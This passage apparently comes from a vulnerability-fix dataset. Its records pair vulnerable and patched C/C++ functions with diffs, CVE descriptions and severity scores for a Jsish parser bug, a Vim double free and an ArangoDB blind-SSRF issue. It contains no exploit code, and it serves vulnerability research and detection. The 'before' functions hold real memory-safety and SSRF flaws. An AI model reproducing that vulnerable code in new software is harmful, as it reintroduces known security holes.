+                pstate->err_count++;
+                break;
+            }
             for (j=0; j<args->count; j++) {
-                if (i != j && !Jsi_Strcmp(args->args[i].name, args->args[j].name)) {
-                        if (line)
-                            interp->parseLine = line;
-                        Jsi_LogError(""function %s():  duplicate parameter name '%s'"", name?name:"""", args->args[i].name);
-                        if (line)
-                            interp->parseLine = NULL;
-                        pstate->err_count++;
+                if (i != j && !Jsi_Strcmp(anam, args->args[j].name)) {
+                    if (line)
+                        interp->parseLine = line;
+                    Jsi_LogError(""function %s():  duplicate parameter name '%s'"", name?name:"""", anam);
+                    if (line)
+                        interp->parseLine = NULL;
+                    pstate->err_count++;
                 }
             }
             for (j=0; j<localvar->count; j++) {
                 if (!Jsi_Strcmp(localvar->args[j].name, args->args[i].name)) {
-                        if (line)
-                            interp->parseLine = line;
-                        Jsi_LogError(""function %s():  parameter name conflicts with local '%s'"", name?name:"""", localvar->args[j].name);
-                        if (line)
-                            interp->parseLine = NULL;
-                        pstate->err_count++;
+                    if (line)
+                        interp->parseLine = line;
+                    Jsi_LogError(""function %s():  parameter name conflicts with local '%s'"", name?name:"""", localvar->args[j].name);
+                    if (line)
+                        interp->parseLine = NULL;
+                    pstate->err_count++;
                 }
             }
         }","{'deleted_lines': ['                if (i != j && !Jsi_Strcmp(args->args[i].name, args->args[j].name)) {', '                        if (line)', '                            interp->parseLine = line;', '                        Jsi_LogError(""function %s():  duplicate parameter name \'%s\'"", name?name:"""", args->args[i].name);', '                        if (line)', '                            interp->parseLine = NULL;', '                        pstate->err_count++;', '                        if (line)', '                            interp->parseLine = line;', '                        Jsi_LogError(""function %s():  parameter name conflicts with local \'%s\'"", name?name:"""", localvar->args[j].name);', '                        if (line)', '                            interp->parseLine = NULL;', '                        pstate->err_count++;'], 'added_lines': ['            char *anam = args->args[i].name;', '            if (Jsi_IsReserved(interp, anam, 0)) {', '                if (line)', '                    interp->parseLine = line;', '                Jsi_LogError(""function %s():  reserved parameter name \'%s\'"", name?name:"""", anam);', '                if (line)', '                    interp->parseLine = NULL;', '                pstate->err_count++;', '                break;', '            }', '                if (i != j && !Jsi_Strcmp(anam, args->args[j].name)) {', '                    if (line)', '                        interp->parseLine = line;', '                    Jsi_LogError(""function %s():  duplicate parameter name \'%s\'"", name?name:"""", anam);', '                    if (line)', '                        interp->parseLine = NULL;', '                    pstate->err_count++;', '                    if (line)', '                        interp->parseLine = line;', '                    Jsi_LogError(""function %s():  parameter name conflicts with local \'%s\'"", name?name:"""", localvar->args[j].name);', '                    if (line)', '                        interp->parseLine = NULL;', '                    pstate->err_count++;']}",True,Jsish v3.5.0 was discovered to contain a stack overflow via /usr/lib/x86_64-linux-gnu/libasan.so.4+0x5b1e5.,5.5,MEDIUM,1,valid,2021-12-27T21:08:21Z,4
CVE-2021-4187,['CWE-416'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,vim,"patch 8.2.3923: Vim9: double free with split argument list in nested function

Problem:    Vim9: double free if a nested function has a line break in the
            argument list.
Solution:   Set cmdlinep when freeing the previous line.",4bf1006cae7e87259ccd5219128c3dba75774441,https://github.com/vim/vim/commit/4bf1006cae7e87259ccd5219128c3dba75774441,src/userfunc.c,get_function_args,"static int
get_function_args(
char_u**argp,
char_uendchar,
garray_T*newargs,
garray_T*argtypes,    inttypes_optional,    evalarg_T*evalarg,    int*varargs,
garray_T*default_args,
intskip,
exarg_T*eap,
char_u**line_to_free)
{
intmustend = FALSE;
char_u*arg;
char_u*p;
intc;
intany_default = FALSE;
char_u*expr;
char_u*whitep = *argp;
if (newargs != NULL)
ga_init2(newargs, (int)sizeof(char_u *), 3);
if (argtypes != NULL)
ga_init2(argtypes, (int)sizeof(char_u *), 3);
if (!skip && default_args != NULL)
ga_init2(default_args, (int)sizeof(char_u *), 3);
if (varargs != NULL)
*varargs = FALSE;
arg = skipwhite(*argp);
p = arg;
while (*p != endchar)
{
while (eap != NULL && eap->getline != NULL
&& (*p == NUL || (VIM_ISWHITE(*whitep) && *p == '#')))
{
char_u *theline;
theline = eap->getline(':', eap->cookie, 0, TRUE);
if (theline == NULL)
break;
vim_free(*line_to_free);
*line_to_free = theline;
whitep = (char_u *)"" "";
p = skipwhite(theline);
}
if (mustend && *p != endchar)
{
if (!skip)
semsg(_(e_invarg2), *argp);
goto err_ret;
}
if (*p == endchar)
break;
if (p[0] == '.' && p[1] == '.' && p[2] == '.')
{
if (varargs != NULL)
*varargs = TRUE;
p += 3;
mustend = TRUE;
if (argtypes != NULL)
{
if (!eval_isnamec1(*p))
{
if (!skip)
emsg(_(e_missing_name_after_dots));
goto err_ret;
}
arg = p;
p = one_function_arg(p, newargs, argtypes, types_optional,
evalarg, TRUE, skip);
if (p == arg)
break;
if (*skipwhite(p) == '=')
{
emsg(_(e_cannot_use_default_for_variable_arguments));
break;
}
}
}
else
{
char_u *np;
arg = p;
p = one_function_arg(p, newargs, argtypes, types_optional,
evalarg, FALSE, skip);
if (p == arg)
break;
np = skipwhite(p);
if (*np == '=' && np[1] != '=' && np[1] != '~'
&& default_args != NULL)
{
typval_Trettv;
any_default = TRUE;
p = skipwhite(p) + 1;
whitep = p;
p = skipwhite(p);
expr = p;
if (eval1(&p, &rettv, NULL) != FAIL)
{
if (!skip)
{
if (ga_grow(default_args, 1) == FAIL)
goto err_ret;
while (p > expr && VIM_ISWHITE(p[-1]))
p--;
c = *p;
*p = NUL;
expr = vim_strsave(expr);
if (expr == NULL)
{
*p = c;
goto err_ret;
}
((char_u **)(default_args->ga_data))
[default_args->ga_len] = expr;
default_args->ga_len++;
*p = c;
}
}
else
mustend = TRUE;
}
else if (any_default)
{
emsg(_(""E989: Non-default argument follows default argument""));
goto err_ret;
}
if (VIM_ISWHITE(*p) && *skipwhite(p) == ',')
{
if (!skip)
{
semsg(_(e_no_white_space_allowed_before_str_str), "","", p);
goto err_ret;
}
p = skipwhite(p);
}
if (*p == ',')
{
++p;
if (!skip && argtypes != NULL
&& !IS_WHITE_OR_NUL(*p) && *p != endchar)
{
semsg(_(e_white_space_required_after_str_str), "","", p - 1);
goto err_ret;
}
}
else
mustend = TRUE;
}
whitep = p;
p = skipwhite(p);
}
if (*p != endchar)
goto err_ret;
++p;
*argp = p;
return OK;
err_ret:
if (newargs != NULL)
ga_clear_strings(newargs);
if (!skip && default_args != NULL)
ga_clear_strings(default_args);
return FAIL;
}","static int
get_function_args(
char_u**VAR_0,
char_uVAR_1,
garray_T*VAR_2,
garray_T*VAR_3,
intVAR_4,
evalarg_T*VAR_5,
int*VAR_6,
garray_T*VAR_7,
intVAR_8,
exarg_T*VAR_9,
char_u**VAR_10)
{
intVAR_11 = FALSE;
char_u*VAR_12;
char_u*VAR_13;
intVAR_14;
intVAR_15 = FALSE;
char_u*VAR_16;
char_u*VAR_17 = *VAR_0;
if (VAR_2 != NULL)
ga_init2(VAR_2, (int)sizeof(char_u *), 3);
if (VAR_3 != NULL)
ga_init2(VAR_3, (int)sizeof(char_u *), 3);
if (!VAR_8 && VAR_7 != NULL)
ga_init2(VAR_7, (int)sizeof(char_u *), 3);
if (VAR_6 != NULL)
*VAR_6 = FALSE;
VAR_12 = skipwhite(*VAR_0);
VAR_13 = VAR_12;
while (*VAR_13 != VAR_1)
{
while (VAR_9 != NULL && VAR_9->getline != NULL
&& (*VAR_13 == VAR_18 || (VIM_ISWHITE(*VAR_17) && *VAR_13 == '#')))
{
char_u *VAR_19;
VAR_19 = VAR_9->getline(':', VAR_9->cookie, 0, TRUE);
if (VAR_19 == NULL)
break;
vim_free(*VAR_10);
*VAR_10 = VAR_19;
VAR_17 = (char_u *)"" "";
VAR_13 = skipwhite(VAR_19);
}
if (VAR_11 && *VAR_13 != VAR_1)
{
if (!VAR_8)
semsg(_(VAR_20), *VAR_0);
goto err_ret;
}
if (*VAR_13 == VAR_1)
break;
if (VAR_13[0] == '.' && VAR_13[1] == '.' && VAR_13[2] == '.')
{
if (VAR_6 != NULL)
*VAR_6 = TRUE;
VAR_13 += 3;
VAR_11 = TRUE;
if (VAR_3 != NULL)
{
if (!eval_isnamec1(*VAR_13))
{
if (!VAR_8)
emsg(_(VAR_21));
goto err_ret;
}
VAR_12 = VAR_13;
VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
VAR_5, TRUE, VAR_8);
if (VAR_13 == VAR_12)
break;
if (*skipwhite(VAR_13) == '=')
{
emsg(_(VAR_22));
break;
}
}
}
else
{
char_u *VAR_23;
VAR_12 = VAR_13;
VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
VAR_5, FALSE, VAR_8);
if (VAR_13 == VAR_12)
break;
VAR_23 = skipwhite(VAR_13);
if (*VAR_23 == '=' && VAR_23[1] != '=' && VAR_23[1] != '~'
&& VAR_7 != NULL)
{
typval_TVAR_24;
VAR_15 = TRUE;
VAR_13 = skipwhite(VAR_13) + 1;
VAR_17 = VAR_13;
VAR_13 = skipwhite(VAR_13);
VAR_16 = VAR_13;
if (eval1(&VAR_13, &VAR_24, NULL) != VAR_25)
{
if (!VAR_8)
{
if (ga_grow(VAR_7, 1) == VAR_25)
goto err_ret;
while (VAR_13 > VAR_16 && VIM_ISWHITE(VAR_13[-1]))
VAR_13--;
VAR_14 = *VAR_13;
*VAR_13 = VAR_18;
VAR_16 = vim_strsave(VAR_16);
if (VAR_16 == NULL)
{
*VAR_13 = VAR_14;
goto err_ret;
}
((char_u **)(VAR_7->ga_data))
[VAR_7->ga_len] = VAR_16;
VAR_7->ga_len++;
*VAR_13 = VAR_14;
}
}
else
VAR_11 = TRUE;
}
else if (VAR_15)
{
emsg(_(""E989: Non-default argument follows default argument""));
goto err_ret;
}
if (VIM_ISWHITE(*VAR_13) && *skipwhite(VAR_13) == ',')
{
if (!VAR_8)
{
semsg(_(VAR_26), "","", VAR_13);
goto err_ret;
}
VAR_13 = skipwhite(VAR_13);
}
if (*VAR_13 == ',')
{
++VAR_13;
if (!VAR_8 && VAR_3 != NULL
&& !IS_WHITE_OR_NUL(*VAR_13) && *VAR_13 != VAR_1)
{
semsg(_(VAR_27), "","", VAR_13 - 1);
goto err_ret;
}
}
else
VAR_11 = TRUE;
}
VAR_17 = VAR_13;
VAR_13 = skipwhite(VAR_13);
}
if (*VAR_13 != VAR_1)
goto err_ret;
++VAR_13;
*VAR_0 = VAR_13;
return VAR_28;
err_ret:
if (VAR_2 != NULL)
ga_clear_strings(VAR_2);
if (!VAR_8 && VAR_7 != NULL)
ga_clear_strings(VAR_7);
return VAR_25;
}",vim/4bf1006cae7e87259ccd5219128c3dba75774441/userfunc.c/vul/before/0.json,"static int
get_function_args(
    char_u	**argp,
    char_u	endchar,
    garray_T	*newargs,
    garray_T	*argtypes,	// NULL unless using :def
    int		types_optional,	// types optional if ""argtypes"" is not NULL
    evalarg_T	*evalarg,	// context or NULL
    int		*varargs,
    garray_T	*default_args,
    int		skip,
    exarg_T	*eap,
    char_u	**line_to_free)
{
    int		mustend = FALSE;
    char_u	*arg;
    char_u	*p;
    int		c;
    int		any_default = FALSE;
    char_u	*expr;
    char_u	*whitep = *argp;

    if (newargs != NULL)
	ga_init2(newargs, (int)sizeof(char_u *), 3);
    if (argtypes != NULL)
	ga_init2(argtypes, (int)sizeof(char_u *), 3);
    if (!skip && default_args != NULL)
	ga_init2(default_args, (int)sizeof(char_u *), 3);

    if (varargs != NULL)
	*varargs = FALSE;

    /*
     * Isolate the arguments: ""arg1, arg2, ...)""
     */
    arg = skipwhite(*argp);
    p = arg;
    while (*p != endchar)
    {
	while (eap != NULL && eap->getline != NULL
			 && (*p == NUL || (VIM_ISWHITE(*whitep) && *p == '#')))
	{
	    char_u *theline;

	    // End of the line, get the next one.
	    theline = eap->getline(':', eap->cookie, 0, TRUE);
	    if (theline == NULL)
		break;
	    vim_free(*line_to_free);
	    if (*eap->cmdlinep == *line_to_free)
		*eap->cmdlinep = theline;
	    *line_to_free = theline;
	    whitep = (char_u *)"" "";
	    p = skipwhite(theline);
	}

	if (mustend && *p != endchar)
	{
	    if (!skip)
		semsg(_(e_invarg2), *argp);
	    goto err_ret;
	}
	if (*p == endchar)
	    break;

	if (p[0] == '.' && p[1] == '.' && p[2] == '.')
	{
	    if (varargs != NULL)
		*varargs = TRUE;
	    p += 3;
	    mustend = TRUE;

	    if (argtypes != NULL)
	    {
		// ...name: list<type>
		if (!eval_isnamec1(*p))
		{
		    if (!skip)
			emsg(_(e_missing_name_after_dots));
		    goto err_ret;
		}

		arg = p;
		p = one_function_arg(p, newargs, argtypes, types_optional,
							  evalarg, TRUE, skip);
		if (p == arg)
		    break;
		if (*skipwhite(p) == '=')
		{
		    emsg(_(e_cannot_use_default_for_variable_arguments));
		    break;
		}
	    }
	}
	else
	{
	    char_u *np;

	    arg = p;
	    p = one_function_arg(p, newargs, argtypes, types_optional,
							 evalarg, FALSE, skip);
	    if (p == arg)
		break;

	    // Recognize "" = expr"" but not "" == expr"".  A lambda can have
	    // ""(a = expr"" but ""(a == expr"" and ""(a =~ expr"" are not a lambda.
	    np = skipwhite(p);
	    if (*np == '=' && np[1] != '=' && np[1] != '~'
						       && default_args != NULL)
	    {
		typval_T	rettv;

		// find the end of the expression (doesn't evaluate it)
		any_default = TRUE;
		p = skipwhite(p) + 1;
		whitep = p;
		p = skipwhite(p);
		expr = p;
		if (eval1(&p, &rettv, NULL) != FAIL)
		{
		    if (!skip)
		    {
			if (ga_grow(default_args, 1) == FAIL)
			    goto err_ret;

			// trim trailing whitespace
			while (p > expr && VIM_ISWHITE(p[-1]))
			    p--;
			c = *p;
			*p = NUL;
			expr = vim_strsave(expr);
			if (expr == NULL)
			{
			    *p = c;
			    goto err_ret;
			}
			((char_u **)(default_args->ga_data))
						 [default_args->ga_len] = expr;
			default_args->ga_len++;
			*p = c;
		    }
		}
		else
		    mustend = TRUE;
	    }
	    else if (any_default)
	    {
		emsg(_(""E989: Non-default argument follows default argument""));
		goto err_ret;
	    }

	    if (VIM_ISWHITE(*p) && *skipwhite(p) == ',')
	    {
		// Be tolerant when skipping
		if (!skip)
		{
		    semsg(_(e_no_white_space_allowed_before_str_str), "","", p);
		    goto err_ret;
		}
		p = skipwhite(p);
	    }
	    if (*p == ',')
	    {
		++p;
		// Don't give this error when skipping, it makes the ""->"" not
		// found in ""{k,v -> x}"" and give a confusing error.
		// Allow missing space after comma in legacy functions.
		if (!skip && argtypes != NULL
				      && !IS_WHITE_OR_NUL(*p) && *p != endchar)
		{
		    semsg(_(e_white_space_required_after_str_str), "","", p - 1);
		    goto err_ret;
		}
	    }
	    else
		mustend = TRUE;
	}
	whitep = p;
	p = skipwhite(p);
    }

    if (*p != endchar)
	goto err_ret;
    ++p;	// skip ""endchar""

    *argp = p;
    return OK;

err_ret:
    if (newargs != NULL)
	ga_clear_strings(newargs);
    if (!skip && default_args != NULL)
	ga_clear_strings(default_args);
    return FAIL;
}","static int
get_function_args(
    char_u	**VAR_0,
    char_u	VAR_1,
    garray_T	*VAR_2,
    garray_T	*VAR_3,	/* COMMENT_0 */
    int		VAR_4,	/* COMMENT_1 */
    evalarg_T	*VAR_5,	/* COMMENT_2 */
    int		*VAR_6,
    garray_T	*VAR_7,
    int		VAR_8,
    exarg_T	*VAR_9,
    char_u	**VAR_10)
{
    int		VAR_11 = FALSE;
    char_u	*VAR_12;
    char_u	*VAR_13;
    int		VAR_14;
    int		VAR_15 = FALSE;
    char_u	*VAR_16;
    char_u	*VAR_17 = *VAR_0;

    if (VAR_2 != NULL)
	ga_init2(VAR_2, (int)sizeof(char_u *), 3);
    if (VAR_3 != NULL)
	ga_init2(VAR_3, (int)sizeof(char_u *), 3);
    if (!VAR_8 && VAR_7 != NULL)
	ga_init2(VAR_7, (int)sizeof(char_u *), 3);

    if (VAR_6 != NULL)
	*VAR_6 = FALSE;

    /* COMMENT_3 */
                                                
       
    VAR_12 = skipwhite(*VAR_0);
    VAR_13 = VAR_12;
    while (*VAR_13 != VAR_1)
    {
	while (VAR_9 != NULL && VAR_9->getline != NULL
			 && (*VAR_13 == VAR_18 || (VIM_ISWHITE(*VAR_17) && *VAR_13 == '#')))
	{
	    char_u *VAR_19;

	    /* COMMENT_6 */
	    VAR_19 = VAR_9->getline(':', VAR_9->cookie, 0, TRUE);
	    if (VAR_19 == NULL)
		break;
	    vim_free(*VAR_10);
	    if (*VAR_9->cmdlinep == *VAR_10)
		*VAR_9->cmdlinep = VAR_19;
	    *VAR_10 = VAR_19;
	    VAR_17 = (char_u *)"" "";
	    VAR_13 = skipwhite(VAR_19);
	}

	if (VAR_11 && *VAR_13 != VAR_1)
	{
	    if (!VAR_8)
		semsg(_(VAR_20), *VAR_0);
	    goto err_ret;
	}
	if (*VAR_13 == VAR_1)
	    break;

	if (VAR_13[0] == '.' && VAR_13[1] == '.' && VAR_13[2] == '.')
	{
	    if (VAR_6 != NULL)
		*VAR_6 = TRUE;
	    VAR_13 += 3;
	    VAR_11 = TRUE;

	    if (VAR_3 != NULL)
	    {
		/* COMMENT_7 */
		if (!eval_isnamec1(*VAR_13))
		{
		    if (!VAR_8)
			emsg(_(VAR_21));
		    goto err_ret;
		}

		VAR_12 = VAR_13;
		VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
							  VAR_5, TRUE, VAR_8);
		if (VAR_13 == VAR_12)
		    break;
		if (*skipwhite(VAR_13) == '=')
		{
		    emsg(_(VAR_22));
		    break;
		}
	    }
	}
	else
	{
	    char_u *VAR_23;

	    VAR_12 = VAR_13;
	    VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
							 VAR_5, FALSE, VAR_8);
	    if (VAR_13 == VAR_12)
		break;

	    /* COMMENT_8 */
	    /* COMMENT_9 */
	    VAR_23 = skipwhite(VAR_13);
	    if (*VAR_23 == '=' && VAR_23[1] != '=' && VAR_23[1] != '~'
						       && VAR_7 != NULL)
	    {
		typval_T	VAR_24;

		/* COMMENT_10 */
		VAR_15 = TRUE;
		VAR_13 = skipwhite(VAR_13) + 1;
		VAR_17 = VAR_13;
		VAR_13 = skipwhite(VAR_13);
		VAR_16 = VAR_13;
		if (eval1(&VAR_13, &VAR_24, NULL) != VAR_25)
		{
		    if (!VAR_8)
		    {
			if (ga_grow(VAR_7, 1) == VAR_25)
			    goto err_ret;

			/* COMMENT_11 */
			while (VAR_13 > VAR_16 && VIM_ISWHITE(VAR_13[-1]))
			    VAR_13--;
			VAR_14 = *VAR_13;
			*VAR_13 = VAR_18;
			VAR_16 = vim_strsave(VAR_16);
			if (VAR_16 == NULL)
			{
			    *VAR_13 = VAR_14;
			    goto err_ret;
			}
			((char_u **)(VAR_7->ga_data))
						 [VAR_7->ga_len] = VAR_16;
			VAR_7->ga_len++;
			*VAR_13 = VAR_14;
		    }
		}
		else
		    VAR_11 = TRUE;
	    }
	    else if (VAR_15)
	    {
		emsg(_(""E989: Non-default argument follows default argument""));
		goto err_ret;
	    }

	    if (VIM_ISWHITE(*VAR_13) && *skipwhite(VAR_13) == ',')
	    {
		/* COMMENT_12 */
		if (!VAR_8)
		{
		    semsg(_(VAR_26), "","", VAR_13);
		    goto err_ret;
		}
		VAR_13 = skipwhite(VAR_13);
	    }
	    if (*VAR_13 == ',')
	    {
		++VAR_13;
		/* COMMENT_13 */
		/* COMMENT_14 */
		/* COMMENT_15 */
		if (!VAR_8 && VAR_3 != NULL
				      && !IS_WHITE_OR_NUL(*VAR_13) && *VAR_13 != VAR_1)
		{
		    semsg(_(VAR_27), "","", VAR_13 - 1);
		    goto err_ret;
		}
	    }
	    else
		VAR_11 = TRUE;
	}
	VAR_17 = VAR_13;
	VAR_13 = skipwhite(VAR_13);
    }

    if (*VAR_13 != VAR_1)
	goto err_ret;
    ++VAR_13;	/* COMMENT_16 */

    *VAR_0 = VAR_13;
    return VAR_28;

err_ret:
    if (VAR_2 != NULL)
	ga_clear_strings(VAR_2);
    if (!VAR_8 && VAR_7 != NULL)
	ga_clear_strings(VAR_7);
    return VAR_25;
}",vim/4bf1006cae7e87259ccd5219128c3dba75774441/userfunc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -47,6 +47,8 @@
 	    if (theline == NULL)
 		break;
 	    vim_free(*line_to_free);
+	    if (*eap->cmdlinep == *line_to_free)
+		*eap->cmdlinep = theline;
 	    *line_to_free = theline;
 	    whitep = (char_u *)"" "";
 	    p = skipwhite(theline);","{'deleted_lines': [], 'added_lines': ['\t    if (*eap->cmdlinep == *line_to_free)', '\t\t*eap->cmdlinep = theline;']}",True,vim is vulnerable to Use After Free,7.8,HIGH,2,valid,2021-12-28T17:23:12Z,4
CVE-2021-25939,['CWE-918'],AV:N/AC:L/Au:S/C:N/I:P/A:N,0,arangodb,"[APM-78] Disable installation from remote URL (#15292) (#15343)

* [APM-78] Disable installation from remote URL (#15292)

* Update CHANGELOG

* Fix clang-format

Co-authored-by: Vadim <vadim@arangodb.com>",d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175,https://github.com/arangodb/arangodb/commit/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175,arangod/GeneralServer/ServerSecurityFeature.cpp,ServerSecurityFeature::collectOptions,"void ServerSecurityFeature::collectOptions(
std::shared_ptr<ProgramOptions> options) {
options
->addOption(
""--server.harden"",
""lock down REST APIs that reveal version information or server ""
""internals for non-admin users"",
new BooleanParameter(&_hardenedRestApi))
.setIntroducedIn(30500);
options
->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
new BooleanParameter(&_enableFoxxApi),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
options
->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
new BooleanParameter(&_enableFoxxStore),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
}","void ServerSecurityFeature::collectOptions(
std::shared_ptr<ProgramOptions> VAR_0) {
VAR_0
->addOption(
""--server.harden"",
""lock down REST APIs that reveal version information or server ""
""internals for non-admin users"",
new BooleanParameter(&VAR_1))
.setIntroducedIn(30500);
VAR_0
->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
new BooleanParameter(&VAR_2),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
VAR_0
->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
new BooleanParameter(&VAR_3),
arangodb::options::makeFlags(
arangodb::options::Flags::DefaultNoComponents,
arangodb::options::Flags::OnCoordinator,
arangodb::options::Flags::OnSingle))
.setIntroducedIn(30500);
}",arangodb/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175/ServerSecurityFeature.cpp/vul/before/0.json,"void ServerSecurityFeature::collectOptions(
    std::shared_ptr<ProgramOptions> options) {
  options
      ->addOption(
          ""--server.harden"",
          ""lock down REST APIs that reveal version information or server ""
          ""internals for non-admin users"",
          new BooleanParameter(&_hardenedRestApi))
      .setIntroducedIn(30500);

  options
      ->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
                  new BooleanParameter(&_enableFoxxApi),
                  arangodb::options::makeFlags(
                      arangodb::options::Flags::DefaultNoComponents,
                      arangodb::options::Flags::OnCoordinator,
                      arangodb::options::Flags::OnSingle))
      .setIntroducedIn(30500);
  options
      ->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
                  new BooleanParameter(&_enableFoxxStore),
                  arangodb::options::makeFlags(
                      arangodb::options::Flags::DefaultNoComponents,
                      arangodb::options::Flags::OnCoordinator,
                      arangodb::options::Flags::OnSingle))
      .setIntroducedIn(30500);
  options
      ->addOption(
          ""--foxx.allow-install-from-remote"",
          ""allow installing Foxx apps from remote URLs other than Github"",
          new BooleanParameter(&_foxxAllowInstallFromRemote),
          arangodb::options::makeFlags(
              arangodb::options::Flags::DefaultNoComponents,
              arangodb::options::Flags::OnCoordinator,
              arangodb::options::Flags::OnSingle))
      .setIntroducedIn(30805);
}","void ServerSecurityFeature::collectOptions(
    std::shared_ptr<ProgramOptions> VAR_0) {
  VAR_0
      ->addOption(
          ""--server.harden"",
          ""lock down REST APIs that reveal version information or server ""
          ""internals for non-admin users"",
          new BooleanParameter(&VAR_1))
      .setIntroducedIn(30500);

  VAR_0
      ->addOption(""--foxx.api"", ""enables Foxx management REST APIs"",
                  new BooleanParameter(&VAR_2),
                  arangodb::options::makeFlags(
                      arangodb::options::Flags::DefaultNoComponents,
                      arangodb::options::Flags::OnCoordinator,
                      arangodb::options::Flags::OnSingle))
      .setIntroducedIn(30500);
  VAR_0
      ->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
                  new BooleanParameter(&VAR_3),
                  arangodb::options::makeFlags(
                      arangodb::options::Flags::DefaultNoComponents,
                      arangodb::options::Flags::OnCoordinator,
                      arangodb::options::Flags::OnSingle))
      .setIntroducedIn(30500);
  VAR_0
      ->addOption(
          ""--foxx.allow-install-from-remote"",
          ""allow installing Foxx apps from remote URLs other than Github"",
          new BooleanParameter(&VAR_4),
          arangodb::options::makeFlags(
              arangodb::options::Flags::DefaultNoComponents,
              arangodb::options::Flags::OnCoordinator,
              arangodb::options::Flags::OnSingle))
      .setIntroducedIn(30805);
}",arangodb/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175/ServerSecurityFeature.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -24,4 +24,14 @@
                       arangodb::options::Flags::OnCoordinator,
                       arangodb::options::Flags::OnSingle))
       .setIntroducedIn(30500);
+  options
+      ->addOption(
+          ""--foxx.allow-install-from-remote"",
+          ""allow installing Foxx apps from remote URLs other than Github"",
+          new BooleanParameter(&_foxxAllowInstallFromRemote),
+          arangodb::options::makeFlags(
+              arangodb::options::Flags::DefaultNoComponents,
+              arangodb::options::Flags::OnCoordinator,
+              arangodb::options::Flags::OnSingle))
+      .setIntroducedIn(30805);
 }","{'deleted_lines': [], 'added_lines': ['  options', '      ->addOption(', '          ""--foxx.allow-install-from-remote"",', '          ""allow installing Foxx apps from remote URLs other than Github"",', '          new BooleanParameter(&_foxxAllowInstallFromRemote),', '          arangodb::options::makeFlags(', '              arangodb::options::Flags::DefaultNoComponents,', '              arangodb::options::Flags::OnCoordinator,', '              arangodb::options::Flags::OnSingle))', '      .setIntroducedIn(30805);']}",True,"In ArangoDB, versions v3.7.0 through v3.9.0-alpha.1 have a feature which allows downloading a Foxx service from a publicly available URL. This feature does not enforce proper filtering of requests performed internally, which can be abused by a highly-privileged attacker to perform blind SSRF and send internal requests to localhost.",2.7,LOW,0,valid,2021-12-30T03:34:00Z,4
CVE-2021-25939,['CWE-918'],AV:N/AC:L/Au:S/C:N/I:P/A:N,0,arangodb,"[APM-78] Disable installation from remote URL (#15292) (#15343)

* [APM-78] Disable installation from remote URL (#15292)

* Update CHANGELOG

* Fix clang-format

Co-authored-by: Vadim <vadim@arangodb.com>",d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175,https://github.com/arangodb/arangodb/commit/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175,arangod/GeneralServer/ServerSecurityFeature.cpp,ServerSecurityFeature::ServerSecurityFeature,"ServerSecurityFeature::ServerSecurityFeature(
application_features::ApplicationServer& server)
: ApplicationFeature(server, ""ServerSecurity""),
_enableFoxxApi(true),
_enableFoxxStore(true),
_hardenedRestApi(false) {
setOptional(false);
startsAfter<application_features::GreetingsFeaturePhase>();
}","ServerSecurityFeature::ServerSecurityFeature(
application_features::ApplicationServer& VAR_0)
: ApplicationFeature(VAR_0, ""ServerSecurity""),
_enableFoxxApi(true),
_enableFoxxStore(true),
_hardenedRestApi(false) {
setOptional(false);
VAR_1<application_features::GreetingsFeaturePhase>();
}",arangodb/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175/ServerSecurityFeature.cpp/vul/before/1.json,"ServerSecurityFeature::ServerSecurityFeature(
    application_features::ApplicationServer& server)
    : ApplicationFeature(server, ""ServerSecurity""),
      _enableFoxxApi(true),
      _enableFoxxStore(true),
      _hardenedRestApi(false),
      _foxxAllowInstallFromRemote(false) {
  setOptional(false);
  startsAfter<application_features::GreetingsFeaturePhase>();
}","ServerSecurityFeature::ServerSecurityFeature(
    application_features::ApplicationServer& VAR_0)
    : ApplicationFeature(VAR_0, ""ServerSecurity""),
      _enableFoxxApi(true),
      _enableFoxxStore(true),
      _hardenedRestApi(false),
      _foxxAllowInstallFromRemote(false) {
  setOptional(false);
  VAR_1<application_features::GreetingsFeaturePhase>();
}",arangodb/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175/ServerSecurityFeature.cpp/vul/after/1.json,"--- func_before
+++ func_after
@@ -3,7 +3,8 @@
     : ApplicationFeature(server, ""ServerSecurity""),
       _enableFoxxApi(true),
       _enableFoxxStore(true),
-      _hardenedRestApi(false) {
+      _hardenedRestApi(false),
+      _foxxAllowInstallFromRemote(false) {
   setOptional(false);
   startsAfter<application_features::GreetingsFeaturePhase>();
 }","{'deleted_lines': ['      _hardenedRestApi(false) {'], 'added_lines': ['      _hardenedRestApi(false),', '      _foxxAllowInstallFromRemote(false) {']}",True,"In ArangoDB, versions v3.7.0 through v3.9.0-alpha.1 have a feature which allows downloading a Foxx service from a publicly available URL. This feature does not enforce proper filtering of requests performed internally, which can be abused by a highly-privileged attacker to perform blind SSRF and send internal requests to localhost.",2.7,LOW,0,valid,2021-12-30T03:34:00Z,4
CVE-2021-25939,['CWE-918'],AV:N/AC:L/Au:S/C:N/I:P/A:N,0,arangodb,"[APM-78] Disable installation from remote URL (#15292) (#15343)

* [APM-78] Disable installation from remote URL (#15292)

